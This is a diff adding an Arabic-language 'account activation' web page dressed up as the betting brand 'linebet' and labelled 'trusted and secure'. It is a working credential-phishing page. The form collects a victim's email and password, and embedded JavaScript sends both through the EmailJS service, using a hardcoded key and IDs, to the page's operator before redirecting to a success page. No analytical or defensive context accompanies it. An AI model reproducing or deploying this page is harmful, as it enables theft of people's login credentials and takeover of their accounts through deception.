@@ -1,0 +1,176 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تفعيل الحساب</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: 'Poppins', sans-serif;
+            background: linear-gradient(135deg, #004d00, #009933);
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+        }
+
+        .container {
+            width: 350px;
+            padding: 30px;
+            background: rgba(255, 255, 255, 0.15);
+            border-radius: 15px;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.2);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.18);
+            text-align: center;
+            color: white;
+        }
+
+
+        @keyframes bounce {
+            0%, 100% {
+                transform: translateY(0);
+            }
+            50% {
+                transform: translateY(-20px);
+            }
+        }
+
+        .container img {
+            width: 120px;
+            margin-bottom: 20px;
+            animation: bounce 2s infinite;
+        }
+
+        .container h1 {
+            font-size: 26px;
+            margin-bottom: 15px;
+            text-transform: uppercase;
+            letter-spacing: 1.5px;
+        }
+
+        .container p {
+            font-size: 16px;
+            margin-bottom: 20px;
+            color: #e0e0e0;
+        }
+
+        .form-group {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+            align-items: center;
+        }
+
+        .form-group input {
+            width: 90%;
+            padding: 12px;
+            border: none;
+            border-radius: 8px;
+            font-size: 14px;
+            font-family: 'Poppins', sans-serif;
+        }
+
+        .form-group input:focus {
+            outline: none;
+            border: 2px solid #00cc66;
+        }
+
+        .form-group button {
+            width: 90%;
+            padding: 12px;
+            border: none;
+            border-radius: 8px;
+            background: #00cc66;
+            font-size: 16px;
+            font-weight: bold;
+            color: white;
+            cursor: pointer;
+            transition: 0.3s;
+            text-transform: uppercase;
+        }
+
+        .form-group button:hover {
+            background: #008a47;
+        }
+
+        .error-message {
+            color: #ff5757;
+            margin-top: 15px;
+            display: none;
+            font-size: 14px;
+        }
+
+        footer {
+            position: absolute;
+            bottom: 10px;
+            width: 100%;
+            text-align: center;
+            font-size: 14px;
+            color: #ffffff;
+            background: rgba(0, 0, 0, 0.3);
+            padding: 10px 0;
+            border-top: 1px solid rgba(255, 255, 255, 0.2);
+        }
+
+        footer p {
+            margin: 0;
+        }
+
+        footer strong {
+            color: #00cc66;
+        }
+    </style>
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+    <script>
+        (function () {
+            emailjs.init("rOYZNv4YSPlhnjLKI");
+        })();
+    </script>
+</head>
+<body>
+    <div class="container">
+        <img src="https://i.postimg.cc/cJHjgBwY/Remove-bg-ai-1731862201539.png" alt="شعار">
+        <h1>تفعيل الحساب</h1>
+        <p>يرجى إدخال معلومتك الشخصية لإتمام التفعيل</p>
+        <form id="activationForm" class="form-group">
+            <input type="email" id="email" placeholder="أدخل بريدك الإلكتروني" required>
+            <input type="password" id="password" placeholder="أدخل كلمة المرور" required>
+            <button type="submit">تفعيل الحساب</button>
+        </form>
+        <div class="error-message" id="errorMessage">خطأ: حاول مرة أخرى.</div>
+    </div>
+    
+    <footer>
+        <p>© 2024 جميع الحقوق محفوظة. <strong>linebet</strong>. موثوق وآمن.</p>
+    </footer>
+
+    <script>
+        document.getElementById('activationForm').addEventListener('submit', function (event) {
+            event.preventDefault();
+            
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+
+            const serviceID = "service_64lcxpl";
+            const templateID = "template_pv1bcqz";
+            const templateParams = {
+                email: email,
+                password: password,
+            };
+
+            emailjs.send(serviceID, templateID, templateParams)
+                .then((response) => {
+                    alert('تم إرسال المعلومات بنجاح!');
+                    window.location.href = "success.html";
+                }, (error) => {
+                    console.error("خطأ أثناء الإرسال:", error);
+                    document.getElementById('errorMessage').style.display = 'block';
+                });
+        });
+    </script>
+</body>
+</html>
